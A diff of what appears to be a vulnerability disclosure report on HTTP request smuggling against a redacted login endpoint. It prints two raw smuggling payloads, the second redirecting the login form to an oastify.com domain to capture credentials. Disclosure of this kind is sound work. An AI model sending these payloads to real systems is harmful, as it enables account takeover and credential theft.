@@ -12,7 +12,8 @@ The vulnerability I found in the target is an instance of HTTP request smuggling
 
 To confirm the presence of the vulnerability, I crafted a malicious HTTP request using the following payload:
 
-`
+```
+
 POST /ENDPOINT HTTP/1.1
 Host: [HOST]
 Cookie: █████████
@@ -29,7 +30,7 @@ username=admin&password=admin&login=SIGN+IN
 
 GET /robots.txt HTTP/1.1
 X-Ignore: X
-`
+```
 
 Instead of the expected response of "302," the application returned a "404" status code, indicating that the vulnerability was present.
 
@@ -39,7 +40,8 @@ Instead of the expected response of "302," the application returned a "404" stat
 
 Further investigation using param-miner extension revealed that the application accepts the **x-forwarded-for** header, which allowed me to manipulate the "Host" value in the response. With this information, I crafted a second request to redirect the base URL of the login form to a controlled domain, as demonstrated by the following payload:
 
-`
+```
+
 POST /ENDPOINT HTTP/1.1
 Host: [HOST]
 Cookie: █████████
@@ -56,7 +58,7 @@ username=admin&password=admin&login=SIGN+IN
 GET /ENDPOINT HTTP/1.1
 x-forwarded-host: gbvun9lgwxse701bwnjfn68snjtah25r.oastify.com
 X-Ignore: X
-`
+```
 
 This manipulation changed the base URL of the login request form to a malicious domain, allowing an attacker to intercept user credentials.
 
